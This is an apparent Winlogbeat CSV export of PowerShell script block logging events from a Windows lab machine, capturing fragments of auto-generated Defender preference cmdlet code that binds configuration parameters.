          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ProxyServer'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ProxyBypass')) {
          [object]$__cmdletization_value = ${ProxyBypass}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ProxyBypass'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ProxyBypass'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ForceUseProxyOnly')) {
          [object]$__cmdletization_value = ${ForceUseProxyOnly}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ForceUseProxyOnly'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ForceUseProxyOnly'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableTlsParsing')) {
          [object]$__cmdletization_value = ${DisableTlsParsing}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableTlsParsing'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableTlsParsing'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableHttpParsing')) {
          [object]$__cmdletization_value = ${DisableHttpParsing}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableHttpParsing'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableHttpParsing'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableDnsParsing')) {
          [object]$__cmdletization_value = ${DisableDnsParsing}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableDnsParsing'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableDnsParsing'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableDnsOverTcpParsing')) {
          [object]$__cmdletization_value = ${DisableDnsOverTcpParsing}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableDnsOverTcpParsing'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableDnsOverTcpParsing'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableSshParsing')) {
          [object]$__cmdletization_value = ${DisableSshParsing}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableSshParsing'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableSshParsing'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('PlatformUpdatesChannel')) {
          [object]$__cmdletization_value = ${PlatformUpdatesChannel}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'PlatformUpdatesChannel'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'PlatformUpdatesChannel'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('EngineUpdatesChannel')) {
          [object]$__cmdletization_value = ${EngineUpdatesChannel}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EngineUpdatesChannel'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EngineUpdatesChannel'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DefinitionUpdatesChannel')) {
          [object]$__cmdletization_value = ${DefinitionUpdatesChannel}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DefinitionUpdatesChannel'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DefinitionUpdatesChannel'; ParameterType = 'System.Management.Automation.SwitchParameter'; Binding

ScriptBlock ID: f825ae19-44cf-4ba7-981f-597df47e6edc
Path: ","f825ae19-44cf-4ba7-981f-597df47e6edc","e = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableLowCpuPriority'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('EnableFileHashComputation')) {
          [object]$__cmdletization_value = ${EnableFileHashComputation}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableFileHashComputation'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableFileHashComputation'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('EnableFullScanOnBatteryPower')) {
          [object]$__cmdletization_value = ${EnableFullScanOnBatteryPower}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableFullScanOnBatteryPower'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableFullScanOnBatteryPower'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ProxyPacUrl')) {
          [object]$__cmdletization_value = ${ProxyPacUrl}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ProxyPacUrl'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ProxyPacUrl'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ProxyServer')) {
          [object]$__cmdletization_value = ${ProxyServer}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ProxyServer'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ProxyServer'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ProxyBypass')) {
          [object]$__cmdletization_value = ${ProxyBypass}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ProxyBypass'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ProxyBypass'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ForceUseProxyOnly')) {
          [object]$__cmdletization_value = ${ForceUseProxyOnly}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ForceUseProxyOnly'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ForceUseProxyOnly'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableTlsParsing')) {
          [object]$__cmdletization_value = ${DisableTlsParsing}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableTlsParsing'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableTlsParsing'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableHttpParsing')) {
          [object]$__cmdletization_value = ${DisableHttpParsing}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableHttpParsing'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableHttpParsing'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableDnsParsing')) {
          [object]$__cmdletization_value = ${DisableDnsParsing}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableDnsParsing'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableDnsParsing'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableDnsOverTcpParsing')) {
          [object]$__cmdletization_value = ${DisableDnsOverTcpParsing}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableDnsOverTcpParsing'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableDnsOverTcpParsing'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableSshParsing')) {
          [object]$__cmdletization_value = ${DisableSshParsing}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableSshParsing'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableSshParsing'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('PlatformUpdatesChannel')) {
          [object]$__cmdletization_value = ${PlatformUpdatesChannel}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'PlatformUpdatesChannel'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'PlatformUpdatesChannel'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('EngineUpdatesChannel')) {
          [object]$__cmdletization_value = ${EngineUpdatesChannel}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EngineUpdatesChannel'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EngineUpdatesChannel'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DefinitionUpdatesChannel')) {
          [object]$__cmdletization_value = ${DefinitionUpdatesChannel}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DefinitionUpdatesChannel'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DefinitionUpdatesChannel'; ParameterType = 'System.Management.Automation.SwitchParameter'; Binding",18,20,"-","-","-","-","-","-","-","-","-","-","-","S-1-5-21-504783269-3310020698-1149228630-1001","-","-","{1f14668e-e63b-0001-fad2-141f3be6d801}",wineventlog,"Microsoft-Windows-PowerShell/Operational",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4104,"-","-","-","-","-","-","On create calls","8,136","5,916","{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","Microsoft-Windows-PowerShell",3347,"Execute a Remote Command",CEO,"S-1-5-21-504783269-3310020698-1149228630-1001",vagrant,User,1
"Oct 23, 2022 @ 17:00:34.291",cXkSBIQByII7dpeEiBwm,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","1.12.0","Execute a Remote Command",process,4104,"Oct 23, 2022 @ 17:00:34.649","Oct 23, 2022 @ 17:00:34.212",event,"-","Microsoft-Windows-PowerShell",info,"-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",warning,"Creating Scriptblock text (19 of 20):
s = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableGradualRelease')) {
          [object]$__cmdletization_value = ${DisableGradualRelease}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableGradualRelease'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableGradualRelease'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('AllowNetworkProtectionDownLevel')) {
          [object]$__cmdletization_value = ${AllowNetworkProtectionDownLevel}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowNetworkProtectionDownLevel'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowNetworkProtectionDownLevel'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('AllowDatagramProcessingOnWinServer')) {
          [object]$__cmdletization_value = ${AllowDatagramProcessingOnWinServer}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowDatagramProcessingOnWinServer'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowDatagramProcessingOnWinServer'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('EnableDnsSinkhole')) {
          [object]$__cmdletization_value = ${EnableDnsSinkhole}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableDnsSinkhole'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableDnsSinkhole'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableInboundConnectionFiltering')) {
          [object]$__cmdletization_value = ${DisableInboundConnectionFiltering}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableInboundConnectionFiltering'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableInboundConnectionFiltering'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableRdpParsing')) {
          [object]$__cmdletization_value = ${DisableRdpParsing}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableRdpParsing'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableRdpParsing'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableNetworkProtectionPerfTelemetry')) {
          [object]$__cmdletization_value = ${DisableNetworkProtectionPerfTelemetry}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableNetworkProtectionPerfTelemetry'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableNetworkProtectionPerfTelemetry'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('TrustLabelProtectionStatus')) {
          [object]$__cmdletization_value = ${TrustLabelProtectionStatus}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TrustLabelProtectionStatus'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TrustLabelProtectionStatus'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('AllowSwitchToAsyncInspection')) {
          [object]$__cmdletization_value = ${AllowSwitchToAsyncInspection}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowSwitchToAsyncInspection'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowSwitchToAsyncInspection'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

